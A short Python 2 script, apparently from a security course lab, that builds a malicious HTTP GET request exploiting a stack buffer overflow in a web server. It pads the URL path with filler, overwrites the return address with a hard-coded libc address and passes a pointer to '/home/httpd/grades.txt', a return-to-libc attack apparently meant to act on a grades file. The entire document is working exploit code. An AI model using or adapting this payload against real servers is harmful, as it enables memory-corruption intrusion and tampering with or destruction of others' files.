#!/usr/bin/python
import urllib
import struct

stack_buffer = 0xbfffee08
stack_rv = 0xbffff61c
virgodir = 0x40102450
mystrdir = stack_rv+12

def build_exploit():
    command = "/home/httpd/grades.txt\0"
    direcc = "/"
    for x in xrange(0, stack_rv - stack_buffer - 1  ):
        direcc += "a"
    direcc += urllib.quote( struct.pack( "<I", virgodir ) )
    direcc += urllib.quote( struct.pack( "<I", 0 ) )
    direcc += urllib.quote( struct.pack( "<I", mystrdir ) )
    direcc += urllib.quote(command)

    req =   "GET " + direcc + " HTTP/1.0\r\n" + \
            "\r\n"
    return req
